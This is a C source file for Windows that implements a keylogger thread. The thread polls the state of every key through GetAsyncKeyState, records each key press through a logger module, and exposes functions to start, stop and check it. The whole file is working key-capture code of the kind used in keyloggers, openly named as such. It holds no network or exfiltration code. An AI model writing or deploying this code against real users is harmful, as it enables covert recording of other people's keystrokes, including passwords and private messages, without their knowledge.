#include <Windows.h>
#include "keylogger.h"
#include "logger.h"
#include "../Common/constants.h"

// Global variables for keylogger thread
static HANDLE g_hKeyloggerThread = NULL;
static volatile BOOL g_bStopThread = FALSE;

// Previous key states for detecting key-down transitions
static BYTE g_prevKeyState[256] = {0};

// Keylogger thread function
// Polls keyboard state and logs key presses
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    // Initialize logger
    if (!InitLogger()) {
        return 1;  // Failed to initialize logger
    }

    // Main polling loop
    while (!g_bStopThread) {
        // Poll all keys in the monitored range
        for (int vk = VK_MIN; vk <= VK_MAX; vk++) {
            // Get current key state
            SHORT keyState = GetAsyncKeyState(vk);
            bool isPressed = (keyState & 0x8000) != 0;

            // Detect key-down transition (was up, now down)
            if (isPressed && !g_prevKeyState[vk]) {
                LogKey(vk);
                g_prevKeyState[vk] = 1;
            }
            // Detect key-up transition
            else if (!isPressed && g_prevKeyState[vk]) {
                g_prevKeyState[vk] = 0;
            }
        }

        // Sleep to reduce CPU usage
        Sleep(POLLING_INTERVAL_MS);
    }

    // Cleanup logger
    CleanupLogger();

    return 0;
}

// Start the keylogger thread
bool StartKeylogger() {
    if (g_hKeyloggerThread != NULL) {
        return false;  // Already running
    }

    g_bStopThread = FALSE;

    // Clear previous key states
    ZeroMemory(g_prevKeyState, sizeof(g_prevKeyState));

    // Create keylogger thread
    g_hKeyloggerThread = CreateThread(
        NULL,               // Default security
        0,                  // Default stack size
        KeyloggerThread,    // Thread function
        NULL,               // No parameter
        0,                  // Run immediately
        NULL                // Don't need thread ID
    );

    return (g_hKeyloggerThread != NULL);
}

// Stop the keylogger thread
void StopKeylogger() {
    if (g_hKeyloggerThread == NULL) {
        return;  // Not running
    }

    // Signal thread to stop
    g_bStopThread = TRUE;

    // Wait for thread to finish (with timeout)
    DWORD waitResult = WaitForSingleObject(g_hKeyloggerThread, 5000);
    if (waitResult == WAIT_TIMEOUT) {
        // Thread didn't stop gracefully, force terminate
        TerminateThread(g_hKeyloggerThread, 0);
    }

    // Cleanup
    CloseHandle(g_hKeyloggerThread);
    g_hKeyloggerThread = NULL;
}

// Check if keylogger is currently running
bool IsKeyloggerRunning() {
    if (g_hKeyloggerThread == NULL) {
        return false;
    }

    DWORD exitCode;
    if (GetExitCodeThread(g_hKeyloggerThread, &exitCode)) {
        return (exitCode == STILL_ACTIVE);
    }

    return false;
}
